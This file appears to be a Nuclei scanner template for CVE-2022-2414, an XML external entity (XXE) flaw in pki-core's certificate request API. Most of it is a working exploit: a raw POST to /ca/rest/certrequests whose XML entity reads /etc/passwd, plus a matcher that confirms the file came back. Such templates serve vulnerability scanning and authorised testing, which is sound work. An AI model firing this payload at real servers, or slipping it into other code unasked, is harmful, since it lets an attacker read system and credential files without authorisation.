id: CVE-2022-2414_51pwn_api
info:
  name: CVE-2022-2414_51pwn_api
  author:
  - 51pwn
  severity: Critical
  description: |-
    A flaw was found in pki-core. Access to external entities when parsing XML documents 
    can lead to XML external entity (XXE) attacks. This flaw allows a remote attacker to potentially retrieve the content of arbitrary files by sending specially crafted HTTP requests.
    https://nvd.nist.gov/vuln/detail/CVE-2022-2414
    https://access.redhat.com/security/cve/CVE-2022-2414
  tags: api,web,xxe
requests:
  - raw:
      - |
        POST /ca/rest/certrequests HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
      
        <!--?xml version="1.0" ?-->
        <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
        <CertEnrollmentRequest>
          <Attributes/>
          <ProfileID>&ent;</ProfileID>
        </CertEnrollmentRequest>
    matchers:
      - type: word
        condition: and
        part: body
        words:
        - 'root:*:0:0:'
    matchers-condition: and
    redirects: false
  